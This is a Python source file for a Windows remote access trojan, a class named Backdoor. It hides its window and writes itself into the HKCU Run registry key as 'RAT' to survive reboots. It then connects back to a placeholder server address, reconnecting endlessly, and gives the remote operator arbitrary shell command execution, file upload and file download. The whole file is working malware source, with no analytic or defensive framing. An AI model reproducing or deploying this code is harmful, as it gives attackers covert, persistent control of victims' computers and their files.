import socket
import subprocess
import json
import os
import base64
import sys
import win32gui
import ast
import shutil
import win32gui, win32con
import ast

from winreg import *


The_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)

class Backdoor():
    def __init__(self,ip,port):
        
        try:
            self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.connection.connect((ip,port))
        except Exception:
            my_backdoor=Backdoor("SERVER IP",PORT NO)
            my_backdoor.run()
        self.addStartup()
        
        
    def addStartup(self):
        if getattr(sys,'frozen', False):
            fp = os.path.dirname(os.path.realpath(sys.executable))
        elif __file__:
            fp = os.path.dirname(os.path.realpath(__file__))
        file_name=sys.argv[0].split("\\")[-1]
        new_file_path= fp+ "\\"+file_name
#       evilfileloc=os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
#       shutil.copy(sys.executable,evilfileloc)
        keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
        SetValueEx(key2change, "RAT",0,REG_SZ,new_file_path)    

    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)
        
    
    def reliable_recieve(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(10240000)
                return json.loads(json_data)
            except Exception:#ValueError:
                my_backdoor=Backdoor("SERVER IP",PORT NO)
                my_backdoor.run()
                #continue
        
    def execute_system_command(self,command):
       # print(subprocess.check_output)
        return subprocess.check_output(command, shell=True)
    
    def change_working_directory_to(self,path):
        os.chdir(path)
        return path
    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Succesful"
    
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
        
    def run(self):
        while True:
            command=self.reliable_recieve()
            try:
               # command=ast.literal_eval(command)
                if command == '':
                    continue
                elif command[0]=='exit':
                    self.connection.close()
                    exit()
                elif command[0]=='upload':
                    command_result=self.write_file(command[1],command[2])
                elif command[0]=='download':
                    query=(' '.join(command[1:]))
                    command_result=self.read_file(query)
                
                elif command[0]=='cd' and len(command)>1 and len(command)<3:
                    command_result=self.change_working_directory_to(command[1])
                elif command[0]=='cd' and len(command)>2:
                    query=(' '.join(command[1:]))
                    command_result=self.change_working_directory_to(query)
                else:
                    command_result=self.execute_system_command(command[0])
            except Exception:
                command_result="ERROR DURING EXECUTION"
            self.reliable_send(command_result)
        connection.close()

if __name__ =='__main__' :

    while True:#for i in l:
        try:
            my_backdoor=Backdoor("SERVER IP",PORT NO)
            my_backdoor.run()

        except Exception, KeyboardInterrupt:
            continue
                    

    
